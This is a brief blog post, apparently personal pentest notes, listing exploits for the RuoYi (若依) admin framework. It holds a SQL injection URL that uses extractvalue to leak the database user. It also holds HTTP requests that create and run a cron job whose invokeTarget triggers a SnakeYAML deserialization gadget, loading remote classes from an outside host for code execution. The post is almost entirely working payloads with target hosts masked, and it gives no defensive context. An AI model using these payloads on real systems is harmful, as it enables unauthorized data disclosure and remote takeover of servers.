---
layout: post
title: "::若依:: vulnerability summary"
date: 2022-10-08 17:00:43+800
toc: true
author: Bin4xin
categories:
- blog
tags:
- CVE
- 信息搜集
- vulnerability
---

mark to do.

## SQL inject

```
https://***/prod-api/system/user/list?pageSize=&params%5bdataScope%5d=and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))
```

## CRON job RCE

### create 

```
POST /prod-api/monitor/job HTTP/1.1
Host: ***
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8

{"jobName":"123","jobGroup":"DEFAULT","invokeTarget":"org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://fwgl.ahjkjt.com.6541b.11e4.bnslog.top\"]]]]')","cronExpression":"0/20 * * * * ?","misfirePolicy":1,"concurrent":"0","status":"0"}
```

### list

```
https://***/prod-api/monitor/job/list
```

### run 

```
PUT /prod-api/monitor/job/run HTTP/1.1
Host: ***
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8

{"jobId":8,"jobGroup":"DEFAULT"}
```